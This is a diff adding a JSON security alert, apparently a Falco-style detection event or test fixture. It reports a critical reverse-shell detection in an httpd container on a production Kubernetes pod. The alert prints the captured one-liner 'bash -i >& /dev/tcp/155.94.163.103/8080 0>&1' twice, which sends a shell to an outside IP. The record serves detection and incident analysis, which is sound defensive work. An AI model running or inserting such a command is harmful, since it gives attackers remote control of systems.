@@ -1,0 +1,40 @@
+{
+  "hostname": "k8s-worker-node-03",
+  "output": "2025-01-20T11:45:22.384726153+0000: Critical Redirect STDOUT/STDIN to network connection in container (evt_type=dup user=www-data user_uid=33 user_loginuid=-1 process=bash proc_exepath=/usr/bin/bash parent=apache2 command=bash -i >& /dev/tcp/155.94.163.103/8080 0>&1 terminal=0 exe_flags=EXE_WRITABLE container_id=e5f6a7b8c9d0 container_image=docker.io/library/httpd container_image_tag=2.4 container_name=web-frontend k8s_ns=production k8s_pod_name=httpd-deployment-7c8d9e0f1a-q2w3e fd.name=155.94.163.103:8080 fd.num=1 fd.type=ipv4 fd.sip=10.244.2.15 fd.sport=48392)",
+  "priority": "Critical",
+  "rule": "Redirect STDOUT/STDIN to Network Connection in Container",
+  "source": "syscall",
+  "tags": [
+    "T1059.004",
+    "container",
+    "maturity_stable",
+    "mitre_execution",
+    "network",
+    "process",
+    "shell"
+  ],
+  "time": "2025-01-20T11:45:22.384726153Z",
+  "output_fields": {
+    "container.id": "e5f6a7b8c9d0",
+    "container.image.repository": "docker.io/library/httpd",
+    "container.image.tag": "2.4",
+    "container.name": "web-frontend",
+    "evt.time": 1737373522384726153,
+    "evt.type": "dup",
+    "fd.name": "155.94.163.103:8080",
+    "fd.num": 1,
+    "fd.type": "ipv4",
+    "fd.sip": "10.244.2.15",
+    "fd.sport": 48392,
+    "proc.cmdline": "bash -i >& /dev/tcp/155.94.163.103/8080 0>&1",
+    "proc.exepath": "/usr/bin/bash",
+    "proc.name": "bash",
+    "proc.pname": "apache2",
+    "proc.tty": 0,
+    "user.loginuid": -1,
+    "user.name": "www-data",
+    "user.uid": 33,
+    "k8s.ns.name": "production",
+    "k8s.pod.name": "httpd-deployment-7c8d9e0f1a-q2w3e"
+  }
+}
